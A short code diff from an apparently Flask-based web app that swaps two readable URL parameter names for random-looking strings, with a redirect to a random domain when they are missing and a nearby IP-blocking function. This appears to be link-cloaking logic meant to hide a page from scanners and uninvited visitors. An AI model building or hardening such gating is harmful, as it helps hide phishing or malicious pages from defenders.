@@ -158,8 +158,8 @@ def block_ip():
 @app.route('/')
 def check_links_and_serve():
     # Retrieve 'trexxcoz' and 'coztrexx' parameters from URL
-    trexxcoz = request.args.get('trexxcoz')
-    coztrexx = request.args.get('coztrexx')
+    trexxcoz = request.args.get('wE657UyRfVtO')
+    coztrexx = request.args.get('VfDbGdT4R4ErD54tR1DtR')
 
     if not trexxcoz or not coztrexx:
         # If parameters are missing, redirect to a random domain
